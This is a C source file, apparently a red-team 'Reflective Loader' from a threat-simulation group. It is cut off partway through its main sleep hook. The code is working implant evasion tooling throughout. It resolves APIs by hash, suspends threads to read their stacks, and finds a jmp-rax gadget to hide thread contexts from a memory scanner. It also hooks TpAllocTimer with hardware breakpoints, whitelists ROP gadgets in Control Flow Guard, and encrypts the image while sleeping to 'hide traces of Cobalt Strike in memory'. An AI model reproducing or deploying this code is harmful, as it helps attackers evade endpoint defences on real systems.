/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

#if defined( _WIN64 )

NTSTATUS
NTAPI
RtlCreateTimerQueue(
	_In_ PHANDLE NewTimerQueue
);

NTSTATUS
NTAPI
RtlCopyMappedMemory(
	_In_ LPVOID Destination,
	_In_ LPVOID Source,
	_In_ SIZE_T Length
);

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;
} USTRING, *PUSTRING ;

typedef struct
{
	PVOID	TebInformation;
	ULONG	TebOffset;
	ULONG	BytesToRead;
} THREAD_TEB_INFORMATION ;

NTSTATUS
NTAPI
SystemFunction032(
	_In_ PUSTRING Buffer,
	_In_ PUSTRING Key
);

typedef struct
{
	D_API( CloseThreadpoolCleanupGroupMembers );
	D_API( RtlRemoveVectoredExceptionHandler );
	D_API( NtSignalAndWaitForSingleObject );
	D_API( RtlAddVectoredExceptionHandler );
	D_API( CreateThreadpoolCleanupGroup );
	D_API( SetProcessValidCallTargets );
	D_API( SetThreadpoolThreadMaximum );
	D_API( SetThreadpoolThreadMinimum );
	D_API( NtQueryInformationThread );
	D_API( LdrGetProcedureAddress );
	D_API( WaitForSingleObjectEx );
	D_API( NtWaitForSingleObject );
	D_API( NtQueryVirtualMemory );
	D_API( RtlInitUnicodeString );
	D_API( RtlCopyMappedMemory );
	D_API( RtlCreateTimerQueue );
	D_API( RtlDeleteTimerQueue );
	D_API( NtGetContextThread );
	D_API( NtSetContextThread );
	D_API( SystemFunction032 );
	D_API( RtlCaptureContext );
	D_API( RtlInitAnsiString );
	D_API( NtDuplicateObject );
	D_API( CreateThreadpool );
	D_API( NtSuspendThread );
	D_API( NtGetNextThread );
	D_API( CloseThreadpool );
	D_API( RtlAllocateHeap );
	D_API( VirtualProtect );
	D_API( RtlCreateTimer );
	D_API( NtResumeThread );
	D_API( NtCreateEvent );
	D_API( LdrUnloadDll );
	D_API( RtlFreeHeap );
	D_API( LdrLoadDll );
	D_API( NtContinue );
	D_API( SetEvent );
	D_API( NtClose );
} API ;

/* API Hashes */
#define H_API_RTLREMOVEVECTOREDEXCEPTIONHANDLER	0xad1b018e /* RtlRemoveVectoredExceptionHandler */
#define H_API_RTLADDVECTOREDEXCEPTIONHANDLER	0x2df06c89 /* RtlAddVectoredExceptionHandler */
#define H_API_NTSIGNALANDWAITFORSINGLEOBJECT	0x78983aed /* NtSignalAndWaitForSingleObject */
#define H_API_SETPROCESSVALIDCALLTARGETS	0x647d9236 /* SetProcessValidCallTargets */
#define H_API_NTQUERYINFORMATIONTHREAD		0xf5a0461b /* NtQueryInformationThread */
#define H_API_LDRGETPROCEDUREADDRESS		0xfce76bb6 /* LdrGetProcedureAddress */
#define H_API_NTWAITFORSINGLEOBJECT		0xe8ac0c3c /* NtWaitForSingleObject */
#define H_API_NTQUERYVIRTUALMEMORY		0x10c0e85d /* NtQueryVirtualMemory */
#define H_API_RTLINITUNICODESTRING		0xef52b589 /* RtlInitUnicodeString */
#define H_API_RTLCOPYMAPPEDMEMORY		0x5b56b302 /* RtlCopyMappedMemory */
#define H_API_RTLCREATETIMERQUEUE		0x50ef3c31 /* RtlCreateTimerQueue */
#define H_API_RTLDELETETIMERQUEUE		0xeec188b0 /* RtlDeleteTimerQueue */
#define H_API_WAITFORSINGLEOBJECT		0x0df1b3da /* WaitForSingleObject */
#define H_API_NTGETCONTEXTTHREAD		0x6d22f884 /* NtGetContextThread */
#define H_API_NTSETCONTEXTTHREAD		0xffa0bf10 /* NtSetContextThread */
#define H_API_RTLCAPTURECONTEXT			0xeba8d910 /* RtlCaptureContext */
#define H_API_RTLINITANSISTRING			0xa0c8436d /* RtlInitAnsiString */
#define H_API_NTDUPLICATEOBJECT			0x4441d859 /* NtDuplicateObject */
#define H_API_NTSUSPENDTHREAD			0xe43d93e1 /* NtSuspendThread */
#define H_API_NTGETNEXTTHREAD			0xa410fb9e /* NtGetNextThread */
#define H_API_RTLALLOCATEHEAP			0x3be94c5a /* RtlAllocateHeap */
#define H_API_RTLCREATETIMER			0x1877faec /* RtlCreateTimer */
#define H_API_NTRESUMETHREAD			0x5a4bc3d0 /* NtResumeThread */
#define H_API_NTCREATEEVENT			0x28d3233d /* NtCreateEvent */
#define H_API_LDRUNLOADDLL			0xd995c1e6 /* LdrUnloadDll */
#define H_API_RTLFREEHEAP			0x73a9e4d7 /* RtlFreeHeap */
#define H_API_LDRLOADDLL			0x9e456a43 /* LdrLoadDll */
#define H_API_NTCONTINUE			0xfc3a6c2c /* NtContinue */
#define H_API_SETEVENT				0x9d7ff713 /* SetEvent */
#define H_API_NTCLOSE				0x40d6e69d /* NtClose */

/* LIB Hashes */
#define H_LIB_KERNELBASE			0x03ebb38b /* kernelbase.dll */
#define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */

/* STR Hashes */
#define H_STR_TPALLOCTIMER			0x383d6995 /* TpAllocTimer */
#define H_STR_TEXT				0x0b6ea858 /* .text */

/*!
 *
 * Purpose:
 *
 * Get a handle to the thread pool thread so we can
 * copy its NT_TIB structure from the leaked RSP
 * stack pointer.
 *
!*/
D_SEC( D ) BOOLEAN GetThreadInfoBlockFromStack( _In_ PVOID Address, _Out_ PNT_TIB InfoBlock )
{
	API				Api;
	NT_TIB				Tib;
	CONTEXT				Ctx;
	CLIENT_ID			Cid;
	THREAD_TEB_INFORMATION		Tti;
	MEMORY_BASIC_INFORMATION	Mb1;
	MEMORY_BASIC_INFORMATION	Mb2;

	BOOLEAN				Ret = FALSE;

	HANDLE				Thd = NULL;
	HANDLE				Nxt = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Tib, sizeof( Tib ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Tti, sizeof( Tti ) );
	RtlSecureZeroMemory( &Mb1, sizeof( Mb1 ) );
	RtlSecureZeroMemory( &Mb2, sizeof( Mb2 ) );

	Api.NtQueryInformationThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYINFORMATIONTHREAD );
	Api.NtQueryVirtualMemory     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYVIRTUALMEMORY );
	Api.NtGetContextThread       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
	Api.NtDuplicateObject        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTDUPLICATEOBJECT );
	Api.NtSuspendThread          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSUSPENDTHREAD );
	Api.NtGetNextThread          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETNEXTTHREAD );
	Api.NtResumeThread           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTRESUMETHREAD );
	Api.NtClose                  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	/* Enumerate the entire threads that are available */
	while ( NT_SUCCESS( Api.NtGetNextThread( NtCurrentProcess(), Thd, THREAD_ALL_ACCESS, 0, 0, &Nxt ) ) ) {
		/* Do we have a valid thread? */
		if ( Thd != NULL ) {
			/* Close it! */
			Api.NtClose( Thd );
		};
		/* Move to next thread */
		Thd = C_PTR( Nxt );

		/* Setup parameters we want to query */
		Tti.TebOffset      = FIELD_OFFSET( TEB, ClientId );
		Tti.BytesToRead    = sizeof( CLIENT_ID );
		Tti.TebInformation = C_PTR( &Cid );

		/* Query Information about the target thread */
		if ( NT_SUCCESS( Api.NtQueryInformationThread( Thd, ThreadTebInformation, &Tti, sizeof( Tti ), NULL ) ) ) {
			/* Does not match our current thread? */
			if ( U_PTR( Cid.UniqueThread ) != U_PTR( NtCurrentTeb()->ClientId.UniqueThread ) ) {
				/* Suspend the current thread */
				if ( NT_SUCCESS( Api.NtSuspendThread( Thd, NULL ) ) ) {

					Ctx.ContextFlags = CONTEXT_FULL;

					/* Get information about the current thread */
					if ( NT_SUCCESS( Api.NtGetContextThread( Thd, &Ctx ) ) ) {
						/* Query information about the RSP */
						if ( NT_SUCCESS( Api.NtQueryVirtualMemory( NtCurrentProcess(), Ctx.Rsp, MemoryBasicInformation, &Mb1, sizeof( Mb1 ), NULL ) ) ) {
							/* Query information about the stack leak */
							if ( NT_SUCCESS( Api.NtQueryVirtualMemory( NtCurrentProcess(), Address, MemoryBasicInformation, &Mb2, sizeof( Mb2 ), NULL ) ) ) {
								/* Query information about the same region */
								if ( U_PTR( Mb1.AllocationBase ) == U_PTR( Mb2.AllocationBase ) ) {

									/* Setup parameters of what we want to query */
									Tti.TebOffset      = FIELD_OFFSET( TEB, NtTib );
									Tti.BytesToRead    = sizeof( NT_TIB );
									Tti.TebInformation = C_PTR( InfoBlock );

									/* Query information about the target thread */
									if ( NT_SUCCESS( Api.NtQueryInformationThread( Thd, ThreadTebInformation, &Tti, sizeof( Tti ), NULL ) ) ) {
										/* Status */
										Ret = TRUE ;
									};
								};
							};
						};
					};
					/* Resume the current thread */
					Api.NtResumeThread( Thd, NULL );
				};
			};
		};
		/* Did we read it successfully? */
		if ( Ret != FALSE ) {
			/* Abort! */
			break;
		};
	};
	/* Close the last reference */
	if ( Thd != NULL ) {
		/* Close the handle! */
		Api.NtClose( Thd );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Tib, sizeof( Tib ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Tti, sizeof( Tti ) );
	RtlSecureZeroMemory( &Mb1, sizeof( Mb1 ) );
	RtlSecureZeroMemory( &Mb2, sizeof( Mb2 ) );

	/* Return */
	return Ret;
};

/*!
 *
 * Purpose:
 *
 * Locates a jmp rax 0xFF, 0xE0 gadget in memory.
 * Used as a means of hiding the CONTEXT structure
 * from Patriot.
 *
!*/
D_SEC( D ) PVOID GetJmpRaxTarget( VOID )
{
	HDE			Hde;

	ULONG			Ofs = 0;

	PBYTE			Ptr = NULL;
	PBYTE			Pos = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PIMAGE_SECTION_HEADER	Sec = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Hde, sizeof( Hde ) );

	Dos = C_PTR( PebGetModule( H_LIB_NTDLL ) );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	Sec = IMAGE_FIRST_SECTION( Nth );

	/* Enumerate each individual section in memory */
	for ( INT Idx = 0; Idx < Nth->FileHeader.NumberOfSections ; ++Idx ) {
		/* Locate the .text section in memory */
		if ( HashString( & Sec[ Idx ].Name, 0 ) == H_STR_TEXT ) {

			Ofs = 0;
			Pos = C_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress );

			do 
			{
				/* Attempt to disassemble */
				HDE_DISASM( C_PTR( U_PTR( Pos ) + Ofs ), &Hde );

				/* Did this fail to disassemble? */
				if ( Hde.flags & F_ERROR ) {
					/* Couldnt decode? Odd: Move up one byte! */
					Ofs = Ofs + 1; 

					/* Restart the loop */
					continue;
				};

				/* Is the instruction the right size? */
				if ( Hde.len == 2 ) {
					/* Does the instruction match the correct operand etc? */
					if ( ( ( PBYTE ) ( C_PTR( U_PTR( Pos ) + Ofs ) ) ) [ 0 ] == 0xFF && ( ( PBYTE )( C_PTR( U_PTR( Pos ) + Ofs ) ) ) [ 1 ] == 0xE0 ) {
						/* Set the address of the instruction */
						Ptr = C_PTR( U_PTR( Pos ) + Ofs );

						/* Abort! */
						break;
					};
				};

				/* Increment to next instruction */
				Ofs = Ofs + Hde.len;
			} while ( Ofs < Sec[ Idx ].SizeOfRawData );

			/* Abort! */
			break;
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Hde, sizeof( Hde ) );

	/* Return Address */
	return C_PTR( Ptr );
};

/*!
 *
 * Purpose:
 *
 * Enables a debug breakpoint at the specified addr.
 * Uses DR3 to trigger the breakpoint without issue.
 *
!*/
D_SEC( D ) VOID EnableBreakpoint( _In_ PVOID Addr )
{
	API		Api;
	CONTEXT		Ctx;

	ULONG_PTR	Bit = 0;
	ULONG_PTR	Msk = 0;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );

	Api.NtGetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
	Api.NtSetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );

	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	Api.NtGetContextThread( NtCurrentThread(), &Ctx );

	/* Set DR3 to the specified address */
	Ctx.Dr3 = U_PTR( Addr );

	/* Sets DR0-DR3 for HWBP */
	Msk = ( 1UL << 16 ) - 1UL;
	Bit = ( Ctx.Dr7 &~ ( Msk << 16 ) ) | ( 0 << 16 );
	Ctx.Dr7 = U_PTR( Bit );

	/* Sets DR3 as enabled */
	Msk = ( 1UL << 1 ) - 1UL;
	Bit = ( Ctx.Dr7 &~ ( Msk << 6 ) ) | ( 1 << 6 );
	Ctx.Dr7 = U_PTR( Bit );
	Ctx.Dr6 = U_PTR( 0 );

	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	Api.NtSetContextThread( NtCurrentThread(), &Ctx );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
};

/*!
 *
 * Purpose:
 *
 * Disables DR3 debug register 
 *
!*/

D_SEC( D ) VOID RemoveBreakpoint( _In_ PVOID Addr )
{
	API		Api;
	CONTEXT		Ctx;

	ULONG_PTR	Msk = 0;
	ULONG_PTR	Bit = 0;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );

	Api.NtGetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
	Api.NtSetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );

	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	Api.NtGetContextThread( NtCurrentThread(), &Ctx );

	/* Disables the DR3 local mode! */
	Msk = ( 1ULL << 1 ) - 1UL;
	Bit = ( Ctx.Dr7 &~ ( Msk << 6 ) ) | ( 0 << 6 );
	Ctx.Dr7 = U_PTR( Bit );
	Ctx.Dr6 = U_PTR( 0 );
	Ctx.Dr3 = U_PTR( 0 );
	Ctx.EFlags = Ctx.EFlags &~ 0x100;

	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	Api.NtSetContextThread( NtCurrentThread(), &Ctx );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
};

/*!
 *
 * Purpose:
 *
 * Modifies TpAllocTimer to use a custom thread pool. Inteded to
 * act as a hook for the call RtlCreateTimer and redirected to
 * with a VEH debugger.
 *
!*/
D_SEC( D ) NTSTATUS NTAPI TpAllocTimerHook( _Out_ PTP_TIMER *Timer, _In_ PTP_TIMER_CALLBACK Callback, _Inout_opt_ PVOID Context, _In_opt_ PTP_CALLBACK_ENVIRON CallbackEnviron ) 
{
	PTABLE		Tbl = NULL;
	NTSTATUS 	Ret = STATUS_SUCCESS;

	/* Get a pointer to Table */
	Tbl = C_PTR( G_SYM( Table ) );

	/* Remove a breakpoint on the ntdll!TpAllocTimer  */
	RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );

	/* Execute TpAllocTimer and swap CallbackEnviron with a replacement */
	Ret = ( ( __typeof__( TpAllocTimerHook ) * ) PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) )(
		Timer, Callback, Context, & Tbl->Table->Debugger.PoolEnv

	);

	/* Enables a breakpoint on the ntdll!TpAllocTimer */
	EnableBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );

	/* Return */
	return Ret;
};

/*!
 *
 * Purpose:
 *
 * Simple VEH-based debugger that will attempt to redirect all
 * calls to TpAllocWork to a hooked version which will insert
 * our custom thread pool.
 *
!*/
D_SEC( D ) LONG WINAPI VehDebugger( _In_ PEXCEPTION_POINTERS ExceptionIf )
{
	DWORD	Ret = 0;
	PTABLE	Tbl = NULL;

	Tbl = C_PTR( G_SYM( Table ) );

	/* Is the thread where our debugger comes from ? */
	if ( Tbl->Table->ClientId.UniqueThread == NtCurrentTeb()->ClientId.UniqueThread ) {
		if ( ExceptionIf->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP ) {
			if ( U_PTR( ExceptionIf->ExceptionRecord->ExceptionAddress ) == U_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) ) {
				/* Redirect TpAllocTimer -> TpAllocTimerHook */
				ExceptionIf->ContextRecord->Rip = U_PTR( G_SYM( TpAllocTimerHook ) );
			};
			/* Notify! */
			Ret = EXCEPTION_CONTINUE_EXECUTION;
		};

		/* Return */
		return Ret;
	};

	/* Pretty much ignore all other exceptions! */
	return EXCEPTION_CONTINUE_SEARCH;
};

/*!
 *
 * Purpose:
 *
 * Adds a ROP gadget to the CFG exception list to
 * permit ROP gadgets from being marked as an
 * invalid target.
 *
!*/
D_SEC( D ) VOID CfgEnableFunc( _In_ PVOID ImageBase, _In_ PVOID Function )
{
	API			Api;
	CFG_CALL_TARGET_INFO	Cfg;

	SIZE_T			Len = 0;

	PVOID			Kbs = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Cfg, sizeof( Cfg ) );

	Dos = C_PTR( ImageBase );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	Len = U_PTR( ( Nth->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) );

	if ( ( Kbs = PebGetModule( H_LIB_KERNELBASE ) ) != NULL ) {
		Api.SetProcessValidCallTargets = PeGetFuncEat( Kbs, H_API_SETPROCESSVALIDCALLTARGETS );

		if ( Api.SetProcessValidCallTargets != NULL ) {
			Cfg.Flags  = CFG_CALL_TARGET_VALID;
			Cfg.Offset = U_PTR( Function ) - U_PTR( ImageBase );

			Api.SetProcessValidCallTargets( NtCurrentProcess(), Dos, Len, 1, &Cfg );
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Cfg, sizeof( Cfg ) );
};

/*!
 *
 * Purpose:
 *
 * Uses NightHawk's Obfuscate/Sleep implementation to
 * hide traces of Cobalt Strike in memory. Temporary 
 * version, limited to x86_64 currently.
 *
!*/
D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
{
	API			Api;
	UCHAR			Rnd[ 16 ];
	NT_TIB			Oli;
	NT_TIB			Nwi;
	USTRING			Key;
	USTRING			Buf;
	CONTEXT			Ctx;
	ANSI_STRING		Ani;
	UNICODE_STRING		Uni;

	DWORD			Prt = 0;
	DWORD			Del = 0;
	SIZE_T			XLn = 0;
	SIZE_T			FLn = 0;

	PVOID			Veh = NULL;
	PVOID			Ev1 = NULL;
	PVOID			Ev2 = NULL;
	PVOID			Ev3 = NULL;
	PVOID			K32 = NULL;
	PVOID			Adv = NULL;
	PVOID			Tmr = NULL;
	PVOID			Que = NULL;
	PVOID			Img = NULL;

	PVOID			Cln = NULL;
	PVOID			Pol = NULL;

	PVOID			Gdg = NULL;

	HANDLE			Src = NULL;
	PTABLE			Tbl = NULL;
	PCONTEXT		Cap = NULL;
	PCONTEXT		Beg = NULL;
	PCONTEXT		Set = NULL;
	PCONTEXT		Enc = NULL;
	PCONTEXT		Gt1 = NULL;
	PCONTEXT		Cp1 = NULL;
	PCONTEXT		St1 = NULL;
	PCONTEXT		Blk = NULL;
	PCONTEXT		Cp2 = NULL;
	PCONTEXT		St2 = NULL;
	PCONTEXT		Dec = NULL;
	PCONTEXT		Res = NULL;
	PCONTEXT		End = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Rnd, sizeof( Rnd ) );
	RtlSecureZeroMemory( &Oli, sizeof( Oli ) );
	RtlSecureZeroMemory( &Nwi, sizeof( Nwi ) );
	RtlSecureZeroMemory( &Key, sizeof( Key ) );
	RtlSecureZeroMemory( &Buf, sizeof( Buf ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	Api.RtlRemoveVectoredExceptionHandler = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREMOVEVECTOREDEXCEPTIONHANDLER ); 
	Api.RtlAddVectoredExceptionHandler    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLADDVECTOREDEXCEPTIONHANDLER );
	Api.NtSignalAndWaitForSingleObject    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSIGNALANDWAITFORSINGLEOBJECT );
	Api.LdrGetProcedureAddress            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRGETPROCEDUREADDRESS );
	Api.NtWaitForSingleObject             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
	Api.RtlInitUnicodeString              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING ); 
	Api.RtlCopyMappedMemory               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCOPYMAPPEDMEMORY );
	Api.RtlCreateTimerQueue               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATETIMERQUEUE );
	Api.RtlDeleteTimerQueue               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLDELETETIMERQUEUE );
	Api.NtGetContextThread                = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
	Api.NtSetContextThread                = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );
	Api.RtlCaptureContext                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCAPTURECONTEXT );
	Api.RtlInitAnsiString                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITANSISTRING );
	Api.NtDuplicateObject                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTDUPLICATEOBJECT );
	Api.NtGetNextThread                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETNEXTTHREAD );
	Api.RtlAllocateHeap                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.RtlCreateTimer                    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATETIMER );
	Api.NtCreateEvent                     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATEEVENT );
	Api.LdrUnloadDll                      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Api.RtlFreeHeap                       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.LdrLoadDll                        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );
	Api.NtContinue                        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCONTINUE );
	Api.NtClose                           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	/* Load kernel32.dll if it somehow isnt already! */
	Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"kernel32.dll" ) ) );
	
	if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &K32 ) ) ) {

		Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"advapi32.dll" ) ) );

		if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &Adv ) ) ) {

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "CloseThreadpoolCleanupGroupMembers" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.CloseThreadpoolCleanupGroupMembers );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "CreateThreadpoolCleanupGroup" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.CreateThreadpoolCleanupGroup );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "SetThreadpoolThreadMaximum" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.SetThreadpoolThreadMaximum );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "SetThreadpoolThreadMinimum" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.SetThreadpoolThreadMinimum );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "WaitForSingleObjectEx" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.WaitForSingleObjectEx );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "SystemFunction032" ) ) );
			Api.LdrGetProcedureAddress( Adv, &Ani, 0, &Api.SystemFunction032 );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "CreateThreadpool" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.CreateThreadpool );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "CloseThreadpool" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.CloseThreadpool );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "VirtualProtect" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.VirtualProtect );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "SetEvent" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.SetEvent );

			Tbl = C_PTR( G_SYM( Table ) );
			Img = C_PTR( Tbl->Table->RxBuffer );
			XLn = U_PTR( Tbl->Table->RxLength );
			FLn = U_PTR( Tbl->Table->ImageLength );

			RandomString( &Rnd, sizeof( Rnd ) );

			Key.Buffer = C_PTR( &Rnd );
			Key.Length = Key.MaximumLength = sizeof( Rnd );

			Buf.Buffer = C_PTR( Tbl->Table->RxBuffer );
			Buf.Length = Buf.MaximumLength = Tbl->Table->ImageLength;

			do {
				if ( ! NT_SUCCESS( Api.NtCreateEvent( &Ev1, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
					/* Abort! */
					break;
				};
				if ( ! NT_SUCCESS( Api.NtCreateEvent( &Ev2, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
					/* Abort! */
					break;
				};
				if ( ! NT_SUCCESS( Api.NtCreateEvent( &Ev3, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
					/* Abort! */
					break;
				};

				/* Add an exception handler to handle hooking. */
				if ( ! ( Veh = Api.RtlAddVectoredExceptionHandler( 1, C_PTR( G_SYM( VehDebugger ) ) ) ) ) {
					/* Abort! */
					break;
				};

				/* Initialize the thread pool environment */
				InitializeThreadpoolEnvironment( &Tbl->Table->Debugger.PoolEnv );

				/* Create the thread pool the timer will use */
				if ( !( Pol = Api.CreateThreadpool( NULL ) ) ) {
					/* Abort! */
					break;
				};

				/* Create the cleanup group to free memory */
				if ( !( Cln = Api.CreateThreadpoolCleanupGroup() ) ) {
					/* Abort! */
					break;
				};

				/* Set the minimum and maximum the thread pool uses */
				Api.SetThreadpoolThreadMaximum( Pol, 1 );
				if ( ! Api.SetThreadpoolThreadMinimum( Pol, 1 ) ) {
					/* Abort! */
					break;
				};

				/* Initialize the pool environment information */
				SetThreadpoolCallbackPool( & Tbl->Table->Debugger.PoolEnv, Pol );
				SetThreadpoolCallbackCleanupGroup( & Tbl->Table->Debugger.PoolEnv, Cln, NULL );

				/* Add breakpoint on ntdll!TpAllocTimer */
				EnableBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );

				if ( NT_SUCCESS( Api.RtlCreateTimerQueue( &Que ) ) ) {

					Ctx.ContextFlags = CONTEXT_FULL;

					if ( NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.RtlCaptureContext, &Ctx, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
						if ( NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.SetEvent, Ev1, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
							if ( NT_SUCCESS( Api.NtWaitForSingleObject( Ev1, FALSE, NULL ) ) ) {
								if ( !( Cap = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
									/* Abort! */
									break;
								};
